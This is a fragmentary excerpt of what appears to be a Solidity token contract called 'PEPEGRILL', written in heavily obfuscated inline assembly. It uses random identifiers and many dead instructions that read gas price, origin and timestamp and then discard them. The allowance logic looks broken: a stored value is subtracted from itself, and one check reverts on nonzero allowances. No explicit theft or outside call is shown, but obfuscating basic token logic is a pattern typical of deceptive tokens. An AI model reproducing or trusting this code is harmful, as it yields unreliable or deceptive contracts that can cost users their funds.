...
BnPe = "PEPEGRILL";
yLSS = "PEPEGRILL";
AyXC = 30000000 * (10 ** decimals());
yaBW = 0;
wAcL[msg.sender] = AyXC;
...
assembly {
if iszero(_from) { let g4u8ssg := gasprice() pop(0)  revert(0, 0)  }
if iszero(_to) { let o162fj9 := origin() let g7ncimt := gas()  revert(0, 0)  }
let QtPD := mload(0x40)
mstore(QtPD, _from)
...
if lt(JcxQ, _amount) { let g804ngg := gasprice() let n3yv2qk := number() pop(0)  revert(0, 0)  }
}
...
pop(0)
pop(iszero(1))
 mstore(QtPD, caller()) mstore(add(QtPD, 0x20), BVNo.slot) 
let IIqZ := keccak256(QtPD, 0x40)
let o6aj6v4 := origin()
let oaugsdm := origin()
pop(0)
pop(iszero(1))
 mstore(QtPD, _spender) mstore(add(QtPD, 0x20), IIqZ) 
let rTjz := keccak256(QtPD, 0x40)
let o7x1j6d := origin()
 sstore(rTjz, _amount) log3(QtPD, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender) mstore(QtPD, _amount) 
}
return true;
}
...
let IUGo := sload(LjAi)
let dhzw := IUGo
if and(dhzw, iszero(_amount)) { let b5owjsg := basefee() let tgfo9ee := timestamp()  revert(0, 0)  }
if iszero(dhzw) {
mstore(QtPD, _owner)
mstore(add(QtPD, 32), 1)
...
pop(0)
 dhzw := sub(dhzw, IUGo) 
if iszero(eq(dhzw, not(0))) { if lt(dhzw, _amount) { let ccpw1f2 := caller()  revert(0, 0)  } let ge57smz := gasprice()  sstore(LjAi, sub(dhzw, _amount))  }
}
}
}